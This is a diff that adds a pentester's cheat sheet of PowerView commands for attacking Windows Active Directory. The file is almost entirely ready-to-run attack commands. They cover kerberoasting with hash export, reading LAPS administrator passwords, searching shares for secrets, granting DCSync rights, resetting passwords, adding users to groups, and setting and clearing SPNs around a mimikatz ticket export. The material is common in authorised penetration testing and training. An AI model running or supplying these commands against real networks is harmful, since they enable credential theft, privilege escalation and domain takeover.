@@ -1,0 +1,65 @@
+# source 
+https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1
+
+# get domain controller for current domain
+Get-NetDomainController
+
+# kerberoast
+Invoke-Kerberoast -OutputFormat [hashcat|john]> | % { $_.Hash } | Out-File -Encoding utf8 <file>
+
+# get remote logged in user
+Get-NetSession -ComputerName <fqdnRhost>
+
+# get all users that can read the LAPS password of a specific host
+Get-NetComputer -ComputerName '<fqdnRhost>' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject
+
+# read LAPS password for single host
+$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
+Get-DomainObject <fqdnRhost> -Credential $Cred -Properties 'ms-mcs-AdmPwd',name
+
+# get object descriptions
+Get-NetUser | select-object samaccountname,description | fl | Out-File <file>.txt
+
+# get specific user description
+Get-NetUser -Username <user> 
+
+# get list of computers
+Get-NetComputer -FullData
+
+# find interesting files on readable share
+Invoke-FileFinder -IncludeC -IncludeAdmin -Terms pass,admin,secret,tomcat,login -OfficeDocs -Verbose -OutFile filefinder.csv
+
+# get list of all domain trusts
+Get-NetDomainTrust
+
+# get details about the current forest
+Get-NetForest
+
+# find all machines where user has local admin rights
+Find-LocalAdminAccess –Verbose
+
+# add full permissions over a group to specific user (right = All or ResetPassword or WriteMembers)
+Add-ObjectAcl -TargetADSprefix 'CN=<group>,CN=System' -PrincipalSamAccountName <user> -Rights <right> -Verbose
+
+# add DCSync right to a specific user
+Add-ObjectAcl -TargetDistinguishedName 'DC=<domainController>,DC=local' -PrincipalSamAccountName <user> -Rights DCSync -Verbose
+
+# set a new password for specific user
+Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Verbose
+
+# add user to a group
+Add-DomainGroupMember -Identity '<group>' -Members <user> -Verbose
+
+# check if user has SPN set (targeted kerberoast)
+Get-DomainUser -Identity <userOrComputer> | select serviceprincipalname
+
+# set a new SPN
+Set-DomainObject -Identity <userOrComputer> -Set @{serviceprincipalname='foo/bar'}
+
+# request ticket from SPN
+Request-SPNTicket -SPN 'foo/bar'
+
+# after export of tickets using mimikatz remove SPN
+Set-DomainObject -Credential $Cred -Identity <userOrComputer> -Clear serviceprincipalname
+
